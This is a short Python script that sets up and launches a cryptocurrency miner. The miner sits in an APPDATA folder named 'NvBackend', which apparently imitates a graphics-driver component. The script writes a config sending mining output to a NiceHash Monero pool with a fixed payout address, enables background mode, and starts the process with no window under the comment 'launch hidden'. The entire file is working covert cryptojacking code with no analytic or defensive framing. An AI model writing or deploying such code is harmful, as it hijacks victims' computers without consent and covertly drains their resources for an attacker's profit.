import os, json, pathlib, subprocess, psutil
app = pathlib.Path(os.getenv("APPDATA")) / "NvBackend"
bin = next(app.glob("*.exe"))
conf = app / "config.json"

cfg = {
    "pools": [{"url":"stratum+tcp://randomxmonero.usa.nicehash.com:3380",
               "user":"bc1qqds76wl2lglz540cwkvznyj79ly8k5unc027kr","pass":"x"}],
    "cpu": {"enabled":True,"max-threads-hint":50},
    "background":True,"donate-level":0
}
conf.write_text(json.dumps(cfg, indent=2))

# launch hidden
subprocess.Popen([str(bin), "--config", str(conf)], creationflags=subprocess.CREATE_NO_WINDOW)
